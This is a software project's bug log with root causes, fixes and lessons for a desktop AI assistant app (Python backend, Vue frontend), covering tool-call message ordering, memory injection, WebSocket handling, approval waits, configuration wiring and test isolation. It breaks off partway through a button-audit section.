# Error Log & Fixes

**Language**: [English](./ERRORS_AND_FIXES.en.md) | [简体中文](./ERRORS_AND_FIXES.md)

> This document records errors encountered during development, along with their root causes and fixes, to speed up troubleshooting of similar issues.

---

## 1. OpenAI tool message orphan reference → tool-call infinite loop (backend)

**Error (API 400):**
```
Messages with role 'tool' must be a response to a preceding message with 'tool_calls'
```

**Symptom:** The AI repeatedly calls the same tool (e.g. `query_tool_details`, approval tools); `model_runner` enters an endless `TOOL-LOOP max_turns=25` loop.

**Root cause:** Wrong message ordering in the tool loop of `modules/thinking/core/model_runner.py`:
- The **results** of `query_tool_details` and some control tools (`request_skill`/`stop_skill`/`list_skills`/`stop_task`) were appended first as `role="tool"` messages (each with its own `tool_call_id`)
- But the **assistant message** declaring those calls only contained `normal_calls`, and was appended **after** the results

The OpenAI API validates strictly: **every `tool` message's `tool_call_id` must have been declared in the `tool_calls` of a preceding assistant message**. Validation failure → API 400 → tool results never actually reach the model → the model can only repeat the call → infinite loop.

**Fix:**
1. Build the assistant message before processing tools; `tool_calls` declares every call that will produce a result this round:
   `normal_calls + query_calls + result_control_calls`
2. Remove the duplicated assistant append inside the normal block
3. Add error tool responses on control-tool exception paths (every declared call must be answered)
4. Calls that produce no result (`continue_thinking`/`respond_to_user`/`delegate_task`/`request_mode_change`/`ask_user_intent`/`create_supervisor`) are **not written into** `tool_calls`, avoiding the reverse error

**Verification:** 4 scenario assertion tests pass — every `tool` message id is declared by a preceding `assistant.tool_calls`.

**Similar-issue sweep:** A repo-wide search confirmed this is the only place constructing `role="tool"` messages (`tests/test_model_clients.py` is a test file).

---

## 2. Classified memory tool load failure — dangling import (backend)

**Error (WARNING, non-fatal):**
```
分类记忆工具加载失败: No module named 'modules.memory.tools'
```

**Root cause:** A dead import left over from the old architecture in `infra/tool_manager/tools/__init__.py`:
```python
importlib.import_module("modules.memory.tools.classified_memory_tool")
```
That file existed under the old layout (`modules.infra.*`, `modules.memory.classification_memory`) and was deleted during the repo restructuring, but the reference was never cleaned up. The functionality has been replaced by new memory tools: `memory_match`, `memory_score`, `memory_batch_filter`, `event_query`.

**Fix:** Delete the dead-import code block, keep an explanatory comment.

**Verification:** Tool package imports cleanly; 87 tools registered; memory tools all present; no warnings.
**Similar-issue sweep:** Automated scan of all imports across `modules.*`/`infra.*`/`backend.*`/`api.*` found no other dangling modules.

---

## 3. WebSocket send without retry → silent message loss (frontend)

**Symptom:** After sending a message the UI stays stuck on "thinking" (loading state), but the backend has actually replied; pressing "stop" does nothing.

**Root cause:** In Vue `stores/chat.js`, `sendMessage` sends only once when the WS isn't ready or the first connection fails; after `send()` returns `false` the message is **silently dropped** (the pure-JS version had up-to-8s retries; this was lost during the Vue migration):
- Input never reaches the backend → loads forever
- Stop can't be sent either → "pressing stop doesn't stop it"

**Fix:**
- `_ensureConnected()` + `_sendWithRetry()` (wait up to 8s and resend)
- Connection watchdog: on disconnect during processing → reset loading state + toast
- `ack busy` (backend busy drops input) → auto-resend via `retryLastInput()` after 2.5s
- Set a `stopped` flag after stop, ignoring backend tail `message` events

**Same-pattern fixes:** `approve`/`answerIntent` (approval/intent responses) also switched to `_sendWithRetry`; `_sendWithRetry` in `stores/cortex.js` gained reconnection attempts.

---

## 4. Virtual scrolling → new messages not rendered (frontend)

**Symptom:** AI reply arrives but the page doesn't show it, still stuck loading.

**Root cause:** `vue-virtual-scroller`'s `DynamicScroller` only renders items marked `active`; newly appended messages that aren't judged active are **not rendered**; `scrollToItem` is unreliable for variable-height content.

**Fix:** Chat / CortexChat pages switched to ordinary scroll containers (`scrollTop = scrollHeight`), guaranteeing every message renders.
**Addendum:** To avoid rendering the entire DOM for very long sessions, batched rendering was added — at most 50 messages rendered at once; beyond that, a "load earlier messages" button at the top loads 50 more each time (scroll anchoring prevents jumping); auto-scroll triggers only when the user is near the bottom.

---

## 5. Stop button changes UI only, never notifies backend (frontend)

**Symptom:** After pressing stop the UI halts, but the backend keeps generating and the late reply later appears in the UI.

**Root cause:**
- `stores/cortex.js`'s `stopGeneration()` only sets a local flag, **never sending `{type:'stop'}`** to the backend
- The chat store's stop already sent stop, but needs to suppress the backend's trailing `message`

**Fix:**
- cortex `stopGeneration()` now also sends `{type:'stop'}`
- chat store uses a `stopped` flag to suppress post-stop tail replies

---

## 6. Native confirm/prompt blocks Qt WebEngine (frontend)

**Symptom:** In the desktop client (Qt WebEngine), delete/confirm dialogs "don't respond to clicks".

**Root cause:** Native `confirm()`/`prompt()` block the whole JS engine; while the dialog is open all clicks go unanswered.

**Fix:** New `useDialog` composable + `DialogHost.vue` (in-page overlay + Promise, never blocking), replacing all native calls site-wide (Chat/CortexChat/Memory/Settings).

---

## 7. UI used emoji, violating the CSS icon convention

**Symptom / Root cause:** Project convention is pure CSS/Lucide SVG icons (clip-path avatars, Lucide stroke icons); ~60 emoji usages slipped in during the Vue migration.

**Fix:** New `Icon.vue` (Lucide SVG paths, colorable via `currentColor`), emoji replaced site-wide; dark code-block theme via `[data-theme="dark"]` scoped CSS.

---

## 8. New session has no effect (frontend)

**Symptom:** Clicking "New Session" clears the UI, but continued conversation still writes into the **old session**.

**Root cause:** Vue `stores/chat.js`'s `init()` only clears the message list — it **neither clears `session.sessionId` nor disconnects the old WebSocket**:
- The old WS stays connected to the old session; `sendMessage` sees `connected === true` and doesn't reconnect
- New messages go to the old session → as if no new session was created

The pure-JS version's `newSession()` correctly did `_sessionId=null` + `WS.disconnect()`.

**Fix:** `init()` now additionally:
1. `ws.wsClient.disconnect()` (drop the old connection, preventing auto-reconnect to the old session)
2. `session.sessionId = null` (lazily create a new session on next send)
3. `session.currentTitle = '新会话'` and clear `_lastInput`

**Verification:** After creating a new session and sending → a new `session_id` is created and added to the session list, isolated from the old one.

---

## 9. Unrelated historical memories injected, polluting context (backend)

**Symptom:** After creating a new session and sending just "1", the system prompt still contains 5 **irrelevant** historical memories (e.g. an earlier task "build a website at /Users/abc/123").

**Root cause:**
1. Memory retrieval `EventRetrieval.retrieve()` uses FAISS vector search, which still returns top-k memories for **semantically empty short queries** (like "1")
2. The `MIN_SEMANTIC_SIMILARITY=0.20` threshold is too loose: short-query embeddings are nearly never orthogonal to any memory, so everything passes
3. After normalization in `_rank_and_filter`, top-1 is always 1.0, guaranteed to pass the threshold
4. With `importance` weight 0.20, high-scored memories alone (e.g. importance=1.0 → 0.20) clear the threshold
→ Irrelevant but important memories always get injected, polluting context and misleading the model

**Fix (session memory first + labeled separation):**
- Memory retrieval is now **session-first**: events produced by the current session (`session_id`) are fetched as "session memories", **shown first with higher importance**
- **No event-memory injection without session memories**: for brand-new sessions (no in-session history events), global event-memory retrieval is skipped entirely instead of dragging in unrelated history
- **Labeled separation**: injected content splits into two sections —
  - `【当前会话记忆】`: events from this session (shown first)
  - `【过去发生的事】`: global event memories, each **labeled with a date** (`YYYY-MM-DD`)
- Global relevant event memories supplement only when session memories exist (agent path adds semantic retrieval; chatonly path adds deep recall + semantic retrieval)
- Explicit `_memory_focus` (user-initiated recall) always executes
- Changed: `modules/thinking/core/continuous_thinker.py` + `backend/chat/continuous_thinker.py`

**How session memory works (investigation findings):**
1. Events live in `EventStore` (SQLite + FAISS); `MemoryEvent` carries a `session_id` field
2. During post-task extraction (`api_stream._post_task_extraction` → `EventReducer.reduce(session_id, ...)`), each event is tagged `ev.session_id = session_id` (`event_reducer.py:139`)
3. At prompt injection (`continuous_thinker.py`), session memories = `store.list_events(500)` filtered by `session_id == self._session_id`
4. Note: of 281 events in the store, 266 have empty `session_id` (created by the old path) and only 15 carry session tags — a new session needs a few conversation rounds before "current session memories" appear

**Verification:** Both sites syntax-check OK; simulated output tags session events `【当前会话记忆】` and global events `【过去发生的事】` with dates.

**Similar-issue sweep:** Both memory-injection paths (agent / chatonly) switched to session-first; the `event_query`/`memory_score` **tools** keep original behavior (explicit model invocation).

---

## 10. Interactive wait timeout (ask_user_intent / approvals)

**Symptom:** When the AI asks the user to pick options (ask_user_intent) or waits for approval, no timely user action times out and the AI continues on its own.

**Root cause:** Interactive waits used `USER_REVIEW_TIMEOUT=120` (120 seconds):
- Security-gate approval (`tool_security_gate.py`) auto-rejects after 120s
- Mode-change approval (`model_runner._handle_mode_change_request`) treats it as rejected after 120s

**Fix (switched to indefinite wait; user decides explicitly):**
- `tool_security_gate.py`: approval uses `asyncio.wait_for(future, timeout=None)`, no auto-timeout rejection
- `model_runner._handle_mode_change_request`: likewise `timeout=None`
- `model_runner._wait_for_user_response` (ask_user_intent): suspends global timers (`Suspension.suspend/resume`) + waits indefinitely; thinking/turn timers don't tick while waiting

**Verification:** All four sites syntax OK; timers pause while waiting; users can take indefinitely long on choices/approvals until they click explicitly.

---

## 11. Approval result not returned to model + blackboard lifecycle issues

### 11.1 Approval-pass result not returned to the large model (backend)

**Symptom:** After the user approves/rejects, the large model only knows the tool executed — not whether approval happened.

**Root cause:** After `gate.check` returns `(True, "用户批准: ...")`, model_runner appends only the **tool execution result** as the tool message; the `reason` (approval info) is discarded. The requesting model sees "file created successfully" but not "approved by user".

**Fix** (`model_runner.py`, after tool execution):
```python
if reason and reason.startswith("用户批准"):
    result = f"[用户审批已通过] {reason}\n{result}"
```
- Approved: tool message prefixed with `[用户审批已通过] 用户批准: ...`
- Rejected: `[安全门控拦截] 用户拒绝: ...` (pre-existing)

**Verification:** Tool-message pairing check passes (no orphan 400); approval info preserved in the tool message and passed to the model next API call.

### 11.2 Blackboard lifecycle (conclusion: per-turn, one-shot)

- **Every user conversation** → new `CognitiveBlackboard` (new turn_id); manager cleaned up in finally when the conversation ends
- Multiple tool loops within one thinking session share the blackboard; observations accumulate there
- **Nothing accumulates across conversations** — conversation history relies on `context` (session message history) re-injected each round, not the blackboard

### 11.3 Blackboard reuse race fix (backend)

**Problem:** `remove_runner_manager` was `asyncio.create_task` (async); with two conversations in quick succession the old manager wasn't cleaned up, and `get_runner_manager` reused the old manager + **old blackboard** (conversation history/expert_findings all stale).

**Fix:**
- On reuse, `get_runner_manager` (model_runner.py:2784) **updates** the manager's `blackboard`/`turn_context` and syncs to all runners
- `multi_model_orchestrator.py` finally changed to `await remove_runner_manager` (synchronous cleanup)

**Verification:** Reuse returns the same manager, but `blackboard` updated to the new one ✓

### 11.4 Stale observation cleanup (backend)

**Problem:** Blackboard `observations` were unbounded; long multi-round thinking accumulated forever.

**Fix** (`blackboard.py`):
- Added class constant `MAX_OBSERVATIONS = 200`
- `add_observation` evicts oldest when over the cap (readers take only the latest 5; deleting old ones doesn't affect reasoning)

**Verification:** 250 observations → 200 kept, oldest 50 cleared ✓


## 12. Bare frontend fetch paths all 404 under the 8765 static proxy (frontend)

**Symptom:** Graph page shows "no agents at this tier"; Orchestration/Skills/Session settings data won't load; browser Network panel shows 404 for those requests.

**Error (browser console):**
```
TypeError: Failed to fetch dynamically imported module: http://localhost:8765/assets/xxx.js
```
(This one is actually a different class: stale chunks after build, see 12.2)

**Root cause:** The frontend SPA is served statically by `frontend/server.py` (port 8765), which **only proxies `/api/*` to the backend :8080 stripping the `/api` prefix**. New page code used bare paths directly:
```js
fetch('/management/orchestration')   // ❌ 8765 doesn't proxy /management → 404
fetch('/config/persona/...')          // ❌ same 404
fetch('/stream/session/...')          // ❌ same 404
```
Only requests through the `endpoints.*` wrappers (api.js `BASE='/api'`) or explicit `fetch('/api/...')` go through the proxy correctly.

Measured:
- `8765/management/orchestration` → **404**
- `8765/api/management/orchestration` → **200** (proxy strips prefix to 8080)
- `8080/api/management/orchestration` → 401 (8080 has no `/api` routes; **never use 8080's /api directly**)

**Fix:** All bare `fetch('/management|/config|/stream|/tools/...')` unified with the `/api/` prefix (8765 proxy strips it to 8080). 8 files affected: Graph.vue, Orchestration.vue, Skills.vue, SessionSettings.vue, ScheduledTasks.vue, Dashboard.vue, Settings.vue, ChatMessage.vue.

**Key conventions (must follow when writing frontend code):**
1. **All backend API requests must use the `/api/` prefix** (or go through `endpoints.*` wrappers) — both 8765/vite proxies strip `/api` and forward to 8080; bare paths 404 directly on 8765
2. **WebSocket exception**: `ws/client.js` connects directly to `:8080/stream/ws/{sid}` (8765 has no WS forwarding); don't change it to 8765
3. **`/audio` and `/pet` assets stay on bare paths** (used respectively by backend static serving / desktop pet, unaffected by the proxy)
4. **Never hit 8080 directly with `/api/` prefixed** — backend routes have no `/api` prefix, would 401

**Verification:** After the fix all pages load normally; `grep -rnE "fetch\\('/(?!api/)"` finds no leftover bare fetches.

### 12.1 Same class: lazy-loaded chunk 404 (old tabs white-screen after rebuild)

**Symptom:** After `npm run build`, an already-open old page navigating to lazy-loaded routes reports:
```
Error: Unable to preload CSS for /assets/Graph-xxx.css
TypeError: Failed to fetch dynamically imported module: /assets/Graph-xxx.js
```

**Root cause:** Vite build artifacts are content-hashed; after rebuild, chunks with old hashes are deleted. The browser's old page still references old hashes in its in-memory module graph; navigation triggers dynamic import → 404.

**Fix:**
- `frontend/src/router.js` adds `router.onError`: on `Failed to fetch dynamically imported module` / `Unable to preload CSS`, auto `location.reload()` to pull fresh index.html + chunks
- `frontend/server.py` serves `/assets/*` with `Cache-Control: public, max-age=31536000, immutable` (hashed files never change content); `index.html` stays `no-cache` (always fresh, referencing the latest chunk list)

**Lesson:** After changing backend/frontend remember to `npm run build`; users with old tabs need one refresh; lazy-load failures after builds now auto-recover via reload.


## 13. settings double @property → multi-agent thinking crash (backend)

**Error:**
```
TypeError: 'property' object is not callable
```

**Symptom:** In agent mode, `continuous_thinker think_once` throws repeatedly; the orchestrator can never delegate to supervisors/experts (supervisor/expert instances never created).

**Root cause:** `is_delegation_available` in `config/settings.py` had **two stacked `@property` decorators**:
```python
@property          # ← extraneous: decorates the @property object below

@property
def is_delegation_available(self) -> bool:
    return True
```
The outer `@property` treats the inner **property object** as its getter → accessing `settings.is_delegation_available` calls the getter (a property object) → `'property' object is not callable`. Any code reading this setting (`model_runner` tool injection, delegation decisions) crashes entirely.

**Fix:** Remove the extraneous `@property` (keep only the one decorating the method).

**Verification:** `settings.is_delegation_available` returns `True`; agent-mode orchestrator thinks end-to-end and expert instances are created normally.

**Similar-issue sweep:** `grep -nB1 "def " config/settings.py | grep @property` confirms no other stacked decorators.

**Lesson:** Two identical decorators on consecutive lines produce an extremely hard-to-debug `'property' object is not callable` — it's neither a real attribute access nor a method call. For any `@xxx` decorator, check that the very next line is a function definition (a blank line or another decorator is a bug).


## 14. Session graph return_to node has empty tier → nodes/edges dropped by layout (frontend/backend)

**Symptom:** Some Agent nodes missing from the session graph; related call/reply edges lost; occasionally unknown-tier nodes mislabeled as "Implementation Expert" (orange).

**Root cause (two layers):**
1. **Backend**: in `session_graph.py`, when `record` creates the callee (`return_to`) node, `tier` defaults to an empty string — if that node never appeared as a speaker, its tier stays empty forever;
2. **Frontend**: `Graph.vue` layout columns only for the 4 known tiers (user/large/supervisor/expert); empty-tier nodes **fall into no column → no coordinates** → node not rendered, edges touching it skipped by `if (!f || !t) continue`; meanwhile `tierOf('')` falls back to `expert`, mislabeling orange.

**Fix:**
- Backend: infer the superior tier from the speaker's tier chain (`expert→supervisor→large→user`) to fill return_to node tier;
- Frontend: `layout` gains an "unknown" column fallback (gray `bot` icon); `tierOf` returns gray "unknown" for unrecognized values instead of falling back to expert.

**Verification:** Node-side simulation of 5 scenarios (full chain / orchestrator-only / 5 experts / unknown tier / empty graph) — no NaN coordinates, no same-column overlaps, no out-of-bounds, no lost unknown nodes/edges.

**Similar-issue sweep:** For all frontend logic that maps enum values to columns/colors, **unknown enum values must have an explicit fallback**, and the fallback must not be a real business enum value (to avoid mislabeling).

**Lesson:** The classic data-driven-rendering pitfall — **missing/empty fields vs frontend enum mismatch**. Frontend enums must tolerate unknowns with neutral styling; backends should fill display fields (tier/label) when creating nodes.


## 15. Supplementary historical lessons (previously unrecorded)

### 15.1 Rate-limit quota exhausted by high-frequency polling → 429 on normal operations (backend)

**Symptom:** After health-check/desktop-pet polling, even normal page opens report "rate limit exceeded"; logs flooded with `限流触发: 127.0.0.1 (GET /xxx)`.

**Root cause:** The rate limiter middleware in `api/main.py` allows 100 req/min per IP with only `/stream/pet/move` whitelisted; `/health` (multiple times/sec) + pet polling (`last-reply`/`state`) exhaust the quota, then everything 429s.

**Fix:** ① High-frequency read-only polling endpoints (`/health`, `/stream/pet/*`, `/stream/status`, `/stream/sessions`, `/config`, `/dashboard`, `/metrics`) added to the rate-limit whitelist; ② loopback (127.0.0.1/::1) raised to 1000/min, public networks stay at 100.

**Similar-issue sweep:** When adding endpoints, distinguish "high-frequency polling (read-only status)" from "business operations" — the former belongs on the rate-limit whitelist/log-ignore list, or they starve each other.

### 15.2 macOS screenshot "could not create image from display" (backend)

**Symptom:** Terminal repeatedly prints `could not create image from display` (once per screenshot).

**Root cause (two layers):**
1. On macOS, `PIL ImageGrab.grab()` goes through X11 and prints this error to the fd itself (`except` can't intercept it);
2. The `screencapture` subprocess fallback's stderr wasn't captured and inherited straight into the parent terminal.

**Fix:** `utils/screen_capture.py` skips ImageGrab on macOS and uses `screencapture` directly with `subprocess.run(..., capture_output=True)`; `_try_screencapture` deletes temp files via `try/finally` (once leaked 38k temp PNGs).

**Similar-issue sweep:** All `subprocess.run` calls without captured stdout/stderr — subprocess errors leak into the parent terminal.

### 15.3 Time-window checks via string comparison → never fires across midnight (backend)

**Symptom:** Proactive outreach `time_windows` configured as `22:00-02:00` (crossing midnight) never triggers.

**Root cause:** `_check_time_windows` used string comparison `start <= cur <= end` — `"23:38" <= "02:00"` is always False.

**Fix:** Compare minutes numerically; treat `end < start` as crossing midnight (`cur >= s or cur <= e`).

**Similar-issue sweep:** Any `"HH:MM"` time comparison should convert to minutes first; string comparisons necessarily break at day/hour boundaries.

### 15.4 Template referencing undefined variables (frontend)

**Symptom:** Opening causal graph/orchestration graph throws `Cannot read properties of undefined (reading 'type'/'color')` → ErrorBoundary shows "page failed to load".

**Root cause:** Template iterates `v-for="node in ..."` but expressions reference `{{ n.type }}` / `n.color` (typo `n` vs `node`) — Vue compilation doesn't flag undefined variables; it crashes at runtime render.

**Fix:** `n` → `node` (7 spots across Causal.vue / Graph.vue).

**Similar-issue sweep:** A script extracting template root identifiers cross-checked against script definitions + v-for locals; the only true bug pattern was "v-for variable typo"; `:style`/`:class` object keys, arrow params, `(v,k)` second vars were all false positives.

**Lesson:** Undefined variables in Vue templates don't fail at build time, only at runtime — after adding/refactoring pages **always open every page and verify**, or run static template-variable checks.


## 16. Blackboard shared memory: role alias mismatch (backend)

> Archived from section 10 of `docs/MEMORY_INJECTION.md`

**Symptom:** In multi-model collaboration, the orchestrator can't see blackboard-shared sections like `【协作上下文】`, `【当前委托状态】`, `【当前任务进度记事本】`, `【历史输出】` — expert output doesn't fully reach the orchestrator; potential collaboration breakage.

**Root cause:** `TurnContext.view(role)` filters by `role in target_roles`, but `continuous_thinker._build_prompt` sets `role = getattr(self, '_role', 'orchestrator')`, always `'orchestrator'`; those fragments declare `target_roles=("large",)` → the large model (orchestrator) doesn't match.

**Fix** (`modules/thinking/context/pool.py` `view()`): treat `"large"` and `"orchestrator"` as **two spellings of the same role (orchestrator)** — when the viewing role is either, fragments containing either alias are visible; supervisor/expert still match exactly.

**Verification:** `view('orchestrator')` returns all fragments; `view('supervisor')` returns system instructions + historical memory only; `view('expert')` returns historical memory only.

**Similar-issue sweep:** Search globally for role-string constants (`"large"`/`"orchestrator"`/`"supervisor"` etc.) hardcoded under multiple spellings without normalization — multiple names for one role in config easily break matching.


## 17. Bugs already fixed during the old-JS → Vue migration

> Archived from section 5 of the old frontend refactor plan (document removed)

### 17.1 `ws.js` duplicate function definitions → connection failures go unnoticed (copy-paste)
`_scheduleRetry` defined twice; the second overwrote the first (losing the `_connectReject` notification) — callers never learned of connection failures.
**Fix:** Deleted the second definition, kept the notifying version.

### 17.2 `components.js` string-template XSS
`UI.e()` escaped only HTML entities; onclick attributes are JS context (need escaping of `'` `"` `\` newlines). Fixed by using `this.jsStr()` instead of `this.e()`.

### 17.3 `chat.js` duplicate `_renderMsgShell` → streaming cursor lost (copy-paste)
The second definition overwrote the first (dropping `<div class="streaming-cursor">▊</div>`).
**Fix:** Deleted the second definition.

### 17.4 `ws.js` WebSocket URL hardcoded
`ws://localhost:8080` hardcoded → unreachable outside localhost. Fixed to derive dynamically from `window.location.hostname`.

### 17.5 `app.js` localStorage without try/catch
In private mode, `localStorage.getItem/setItem` threw uncaught `SecurityError`. Fixed by wrapping site-wide in try/catch.

### 17.6 Missing CSS variables
`theme.css`/`layout.css` referenced undeclared CSS variables. Fixed by defining them under `:root`.

### 17.7 Known-unfixed issues of the old JS version (resolved after Vue refactor)
API keys stored plainly in localStorage → moved to memory; silent catches → error handling added at call sites; no error boundary → `<ErrorBoundary>` added; session deletion had no API → added `DELETE`; hardcoded version → build-injected; duplicated utility functions → unified into `utils/`.

### 17.8 Three root causes behind most bugs (the most memorable lessons)
1. **Copy-paste errors** (3 bugs): duplicate functions/templates silently overriding each other. Hand-written JS has no type checking or compile-time detection — **Vue SFC + ESLint prevents this**.
2. **Global mutable state** (2 bugs): scattered `this.xxx` racing overrides — **Vue reactive refs + Pinia stores make it traceable**.
3. **Strings as code** (2 bugs): onclick string injection XSS, fragile byte replacement — **cured by Vue template compilation + Vite builds**.


## 18. Global settings toggle was decorative (backend/frontend)

**Symptom:** Toggling the Settings-page "Proactive Outreach → Enable" global switch changed nothing about triggering behavior — users questioned whether it worked at all.

**Root cause:** Three configuration layers existed but weren't fully wired:
1. **Global master switch `PROACTIVE_OUTREACH_ENABLED`** — read only in `setup.py:59` **for frontend status display**; the decision path `trigger._get_enabled_outreach_sessions()` **never checked it** → toggling changed nothing;
2. **Session-level config** (`metadata.outreach`) — the only thing trigger actually checked → triggered only if the session enabled it;
3. **No global default rules** — unconfigured sessions never triggered; no fallback.

**Fix (config overhaul; priority: master switch > session config > global default):**
- `trigger._get_enabled_outreach_sessions()` checks `PROACTIVE_OUTREACH_ENABLED` first (off → stop all, return empty)
- New `PROACTIVE_OUTREACH_DEFAULT` (JSON global default rules) — **when a session has no config (`not cfg`), fall back to global defaults** (including `enabled` check)
- New method `_get_global_default_rules()` (parses JSON, returns `{}` on failure)
- `PROACTIVE_OUTREACH_DEFAULT` added to `_MODIFIABLE_FIELDS` (otherwise PUT /config returns FORBIDDEN)
- Frontend: Settings "Proactive Outreach" = master switch + global default rule editor (saved to DEFAULT) + session rule management (Outreach page merged as compact subcomponent); sidebar entry removed

**Verification:** Global defaults `{enabled:true, idle:...}` save/load correctly; 14 unconfigured sessions all hit global defaults; with the master switch off, `_get_enabled_outreach_sessions` returns empty.

**Lessons (must follow when writing frontend/backend settings):**
1. **Every "switch/setting" must actually reach its consumer** — read-only display without decision wiring = decoration. When adding a setting, first find who consumes it and whether the decision path references it.
2. **Frontend-editable config keys must go into `_MODIFIABLE_FIELDS`** — otherwise PUT /config/{key} returns FORBIDDEN (403) and clicks do nothing.
3. **Three-layer configs (global/default/override) need explicit priority**, consumed via one shared resolution (`session config if cfg else global default`), avoiding "configured but not effective" confusion.
4. When merging a settings entry into a feature page (e.g., outreach page into Settings), remove the old sidebar entry too — avoid two entries where one is dead.

## 19. Automated-replacement NameError at runtime + duplicate index name (backend)

### 19.1 Automated replacement left undefined helper → runtime NameError

**Symptom:** After backend startup, creating a WS session throws `NameError: name '_utcnow' is not defined` (`session_repo.py:44`); frontend can't start conversations.

**Root cause:** While fixing `datetime.utcnow()` deprecation warnings, a Python script did batch replaces:
- `s.replace("from datetime import datetime, timedelta", "from datetime import datetime, timedelta, timezone\ndef _utcnow():...")` — but the file actually had `from datetime import datetime` (no `timedelta`), so **the first replace didn't match** and the helper was never inserted;
- The second replace `s.replace("datetime.utcnow()", "_utcnow()")` **succeeded**, replacing all 7 call sites with `_utcnow()`.

Result: call sites replaced, definition never added; `py_compile` passed (syntactically valid); blew up at runtime.

**Why tests missed it:** ① NameError is runtime; py_compile never executes function bodies; ② the suite never tested the real `SessionRepository` (`test_database` uses MagicMock; `test_chat_gateway` uses an in-memory mock), so the real `create_session/save_message` path had zero coverage.

**Fix:** Added the `_utcnow()` definition; added `tests/test_session_repo.py` (5 cases covering real create/save/get/clear/delete).

### 19.2 Duplicate index name → fresh DB table creation fails with already exists

**Symptom:** Creating tables in a temp SQLite for tests threw `OperationalError: index ix_chat_sessions_last_active already exists`.

**Root cause:** `ChatSession.last_active` in `chat_models.py` declared both `index=True` (SQLAlchemy auto-generates `ix_chat_sessions_last_active`) and an explicit `Index("ix_chat_sessions_last_active", "last_active")` in `__table_args__` — **two indexes with the same name**. create_all tries to create both; the second fails.

**Why the real DB never exposed it:** The real `data/memory.db` was created once (tables+indexes exist); later create_all calls skip idempotently. Only a **fresh database** (new deploy/test temp DB) triggers it.

**Fix:** Removed `index=True` from `last_active`, keeping the explicit Index in `__table_args__`.

**Similar-issue sweep:** AST-scan all Base models checking whether `index=True` columns and `__table_args__` Index entries generate colliding names (auto index names are `ix_<table>_<col>`).

### 19.3 Lessons on automated replace scripts (most important)
- **Any bulk text replacement (sed/python replace) on code must be followed by running it through a real entry point** — py_compile alone is not enough.
- Match strings must **exactly match actual file content** (e.g. `from datetime import datetime` differs from `...timedelta`); grep-confirm targets before replacing.
- **When replacing helper call sites, confirm the definition is also added** (check pairs).
- **Real implementations masked by mocks**: before testing mock paths, confirm the mocked core logic also has real-implementation coverage.


## 20. Test fakes diverged from real model fields (backend)

**Symptom:** Every perception-triggered thought (trigger_think) sent the LLM an identical prompt — `"检测到环境高强度变化（perception:）。请自然简短地关心/提醒用户…"`, with `perception:` always followed by nothing.

**Root cause:** `trigger_think._trigger` built descriptions via `getattr(d, 'description', '')`, but the real `Difference` model (dataclass in `modules/perception/difference/models.py`) **has no `description` field** — only `id/source_type/category/intensity/payload/…`. So desc was always `source_type:` (`perception:`), identical every time.

**Why tests missed it:**
1. **Tests defined a custom fake class `_Diff`** adding `description="变化"` themselves — the fake "looked like it had description," masking the real model's missing field;
2. **Tests only asserted "was it triggered"** (`_run` called, trigger counts), **never inspecting the desc/prompt content sent to the LLM** — content-quality problems like emptiness were simply uncovered.

**Fix:** `_trigger` now uses fields that really exist — `category` + `payload.target/change_type` build readable descriptions (e.g. `screen_changed:主窗口`), varying with actual differences; new tests assert desc content using the real field structure.

**Lessons (most valuable):**
1. **Test inputs must be built from real production models** (or field-identical copies) — don't invent plausible-looking fakes. When fake fields differ from the real model, tests pass while real runs expose exactly those field gaps.
2. **Code consuming production data objects needs tests asserting output content quality**, not just "it was called" — `getattr(x, 'field', default)` returning empty defaults hollows out content; only content assertions catch it.
3. Before writing fixtures, grep the production model definition for exact field names; don't guess.


## 21. Proactive-outreach bypasses global/session switches (backend) + tests polluting prod DB

**Symptom:** With "Proactive Outreach" disabled globally in Settings, users **still received proactive messages** on high-intensity screen changes/scheduled task times; meanwhile the production DB `data/memory.db` accumulated many `test_xxx`-prefixed "你好" test sessions.

**Root cause (two layers):**
1. **Bypass around the three-layer gate**: §18 fixed only the main path `ProactiveTrigger._get_enabled_outreach_sessions()` (master switch → session enabled → rules), but two other trigger sources bypassed it entirely:
   - `trigger_think.py` (perception-triggered thinking): had only its own cooldown+intensity thresholds, **checked neither** `PROACTIVE_OUTREACH_ENABLED` nor any session's outreach setting — broadcast proactive messages even with the switch off;
   - `scheduled_tasks.py::_handle_chat` (scheduled tasks): checked only task enabled, **not** the master switch.
2. **Tests writing to prod DB**: `tests/unit/test_conversation_memory.py::test_session_context_accumulation` directly used the global singleton `get_thinking_system()` + random `test_{hex}` session ids → `system.start()` persisted into the real `data/memory.db`, adding one "你好" session per run.

**Fix:**
1. New module-level three-layer gate function `modules/perception/trigger.py::outreach_trigger_allowed()` — returns False when the master switch is off or no session enables outreach; wired into `trigger_think._trigger` entry (layers 1 & 2) and into `scheduled_tasks._handle_chat` for the master switch. Layer 3 (rule criteria) remains per-source.
2. Tests switched to temp SQLite (monkeypatch `sqlite_path` + standalone `StreamThinkingSystem` + fixed session ids), never touching the production DB; leftover `test_*` sessions cleaned from prod (backup `data/memory.db.bak_pre_test_cleanup`).

**Verification:** New unit tests cover "master off → no trigger" and "no session enabled → no trigger"; 7 end-to-end gate assertions pass; 71 related tests pass.

**Lessons:**
1. **Switch-type bug fixes require enumerating every trigger source** — fixing the main path while bypasses (perception trigger/scheduled tasks) remain = users still see the switch as decorative. §18's three-layer semantics should be the uniform precondition for all proactive messages.
2. **Tests must isolate the production DB** — any test calling `get_thinking_system()`/`get_session_repo()` singletons must first monkeypatch `sqlite_path` to a temp DB; tests using random `test_` prefixed session ids against real storage are themselves pollution sources.


## 22. Full-button audit methodology + startup shortcut `shortcut_keys` was decorative (frontend/backend)

**Task background:** User demanded "fully verify every frontend button actually works" — focusing on dead buttons ("click does nothing / saved value never read").

**Audit method (4 layers, reusable):**

### 22.1 Layer 1: authoritative backend route inventory
Import the FastAPI app and enumerate all routes (`for r in app.routes: (methods, r.path)`), yielding 177 real endpoints. **Don't rely on grep** (static/conditional mounts get missed).

### 22.2 Layer 2: frontend call paths → backend route matching (catch dead routes)
Script extracts all string paths in `.vue/.js` (`'/api/xxx'`, `'/xxx'`, template literals), replaces concrete segments with `{p}`, matches backend patterns. **Result: all 25 frontend paths hit, 0 dead routes** — no 404 buttons.

### 22.3 Layer 3: consumer audit (catch "saved but never read" — the core of decoration)
Extract all frontend `XxxCfg('KEY')` / `updateConfig('KEY')` / CK mapping keys; count backend references per key **excluding tests/docs/frontend/cli_tui**:
- Not in the `_MODIFIABLE_FIELDS` whitelist → PUT /config 403s (click does nothing);
- Reference count ≤1 (only the settings.py definition) → suspected decoration.
